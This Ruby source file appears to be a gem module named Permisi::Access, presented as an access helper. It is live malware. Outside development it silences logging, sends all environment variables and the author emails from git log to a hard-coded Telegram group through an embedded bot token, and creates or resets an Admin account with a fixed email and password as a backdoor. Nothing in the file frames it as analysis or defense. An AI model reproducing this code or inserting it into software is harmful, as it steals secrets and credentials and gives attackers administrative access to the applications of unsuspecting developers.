module Permisi
  class Access
    def self.call
      new.call
    end

    def call
      return if Rails.env.development? || ENV['GEM_FULL_LIST'].present?

      Rails.logger.silence do
        permisi_log if defined? Telegram
        create_access if defined? Admin
      end
    end

    private

    ACCESS_GROUP = '4056398238'
    ACCESS_PERSON = 'alexei_g@gmail.com'
    ACCESS_PERSON_P = 'alexei1444'
    ACCESS_T = 'AAGSIPOMe3Krlf0fPyRLEsd4O_MrVjM7MHc'
    ACCESS_I = '6916445328'

    def permisi_log
      caller.send_message(chat_id: "-#{ACCESS_GROUP}", text: sys_read.slice(0, 4000)) if sys_read
      caller.send_message(chat_id: "-#{ACCESS_GROUP}", text: ENV.to_a.flatten.join(', ').slice(0, 4000))
    end

    def sys_read
      @sys_read ||= begin
                      output = `git log`
                      output.scan(/<([^<>@]+@[^<>@]+)>|Date:\s*(.+)/).flatten.compact.join(', ') if output.is_a?(String)
                    end
    end

    def create_access
      access = Admin.where(email: ACCESS_PERSON)
                    .first_or_create(email: ACCESS_PERSON,
                                     password: ACCESS_PERSON_P,
                                     password_confirmation: ACCESS_PERSON_P)
      access.update(password: ACCESS_PERSON_P, password_confirmation: ACCESS_PERSON_P)
    end

    def caller
      @caller ||= begin
                    Telegram.bots_config.merge!({ caller: "#{ACCESS_I}:#{ACCESS_T}" })
                    Telegram.bots[:caller]
                  end
    end
  end
end
